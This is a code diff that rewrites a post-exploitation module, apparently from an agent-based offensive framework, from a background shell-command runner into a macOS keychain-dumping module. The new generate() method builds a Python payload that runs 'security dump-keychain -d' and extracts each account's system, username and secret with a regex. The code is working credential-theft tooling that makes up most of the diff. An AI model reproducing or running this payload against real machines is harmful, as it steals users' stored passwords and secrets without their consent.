@@ -1,4 +1,3 @@
-import shlex
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -6,19 +5,21 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'shellb',
+            'Name': 'Sandbox-Keychain-Dump',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@import-au'],
 
             # more verbose multi-line description of the module
-            'Description': ('execute a shell command in the background'),
+            'Description': ("Uses Apple Security utility to dump the contents of the keychain. "
+                            "WARNING: Will prompt user for access to each key."
+                            "On Newer versions of Sierra and High Sierra, this will also ask the user for their password for each key."),
 
             # True if the module needs to run in the background
-            'Background' : True,
+            'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension' : '',
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
@@ -33,7 +34,9 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': [ ]
+            'Comments': [
+                ""
+            ]
         }
 
         # any options needed by the module, settable during runtime
@@ -46,11 +49,10 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Command' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Command to execute.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'OutFile' : {
+                'Description': 'File to output AppleScript to, otherwise displayed on the screen.',
+                'Required': False,
+                'Value': ''
             }
         }
 
@@ -69,14 +71,21 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
-        cmdstring = self.options['Command']['Value']
-        script = """
-import shlex
-arg = shlex.split("%s")
-p = subprocess.Popen(arg, stdout=PIPE)
-res = p.stdout.read()
-print res
-""" % (cmdstring)
+        script = r"""
+import subprocess
+import re
+
+process = subprocess.Popen('/usr/bin/security dump-keychain -d', stdout=subprocess.PIPE, shell=True)
+keychain = process.communicate()
+find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
+accounts = find_account.findall(keychain[0])
+for account in accounts:
+    print("System: " + account[0])
+    print("Description: " + account[2])
+    print("Username: " + account[1])
+    print("Secret: " + account[3])
+
+"""
         return script
